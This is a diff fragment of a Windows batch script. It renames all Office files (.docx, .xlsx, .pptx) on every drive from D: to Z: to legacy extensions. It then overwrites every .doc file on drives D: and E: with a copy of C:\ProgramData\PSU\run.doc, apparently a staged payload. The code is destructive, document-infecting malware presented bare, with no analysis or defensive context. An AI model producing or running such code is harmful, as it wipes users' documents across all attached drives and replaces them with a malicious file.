+if exist O: (for /f "delims=" %%h in ('dir O:\*.docx /s /b') do ren "%%h" *.doc
+if exist P: (for /f "delims=" %%h in ('dir P:\*.docx /s /b') do ren "%%h" *.doc
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.docx /s /b') do ren "%%h" *.doc
+if exist R: (for /f "delims=" %%h in ('dir R:\*.docx /s /b') do ren "%%h" *.doc
+if exist S: (for /f "delims=" %%h in ('dir S:\*.docx /s /b') do ren "%%h" *.doc
+if exist T: (for /f "delims=" %%h in ('dir T:\*.docx /s /b') do ren "%%h" *.doc
+if exist U: (for /f "delims=" %%h in ('dir U:\*.docx /s /b') do ren "%%h" *.doc
+if exist V: (for /f "delims=" %%h in ('dir V:\*.docx /s /b') do ren "%%h" *.doc
+if exist W: (for /f "delims=" %%h in ('dir W:\*.docx /s /b') do ren "%%h" *.doc
+if exist X: (for /f "delims=" %%h in ('dir X:\*.docx /s /b') do ren "%%h" *.doc
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.docx /s /b') do ren "%%h" *.doc
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /s /b') do ren "%%h" *.doc
+if exist D: (for /f "delims=" %%h in ('dir D:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist E: (for /f "delims=" %%h in ('dir E:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist F: (for /f "delims=" %%h in ('dir F:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist G: (for /f "delims=" %%h in ('dir G:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist H: (for /f "delims=" %%h in ('dir H:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist I: (for /f "delims=" %%h in ('dir I:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist J: (for /f "delims=" %%h in ('dir J:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist K: (for /f "delims=" %%h in ('dir K:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist L: (for /f "delims=" %%h in ('dir L:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist M: (for /f "delims=" %%h in ('dir M:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist N: (for /f "delims=" %%h in ('dir N:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist O: (for /f "delims=" %%h in ('dir O:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist P: (for /f "delims=" %%h in ('dir P:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist R: (for /f "delims=" %%h in ('dir R:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist S: (for /f "delims=" %%h in ('dir S:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist T: (for /f "delims=" %%h in ('dir T:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist U: (for /f "delims=" %%h in ('dir U:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist V: (for /f "delims=" %%h in ('dir V:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist W: (for /f "delims=" %%h in ('dir W:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist X: (for /f "delims=" %%h in ('dir X:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xlsx /s /b') do ren "%%h" *.xls
+if exist D: (for /f "delims=" %%h in ('dir D:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist E: (for /f "delims=" %%h in ('dir E:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist F: (for /f "delims=" %%h in ('dir F:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist G: (for /f "delims=" %%h in ('dir G:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist H: (for /f "delims=" %%h in ('dir H:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist I: (for /f "delims=" %%h in ('dir I:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist J: (for /f "delims=" %%h in ('dir J:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist K: (for /f "delims=" %%h in ('dir K:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist L: (for /f "delims=" %%h in ('dir L:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist M: (for /f "delims=" %%h in ('dir M:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist N: (for /f "delims=" %%h in ('dir N:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist O: (for /f "delims=" %%h in ('dir O:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist P: (for /f "delims=" %%h in ('dir P:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Q: (for /f "delims=" %%h in ('dir Q:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist R: (for /f "delims=" %%h in ('dir R:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist S: (for /f "delims=" %%h in ('dir S:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist T: (for /f "delims=" %%h in ('dir T:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist U: (for /f "delims=" %%h in ('dir U:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist V: (for /f "delims=" %%h in ('dir V:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist W: (for /f "delims=" %%h in ('dir W:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist X: (for /f "delims=" %%h in ('dir X:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Y: (for /f "delims=" %%h in ('dir Y:\*.pptx /s /b') do ren "%%h" *.ppt
+if exist Z: (for /f "delims=" %%h in ('dir Z:\*.pptx /s /b') do ren "%%h" *.ppt
 
 if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
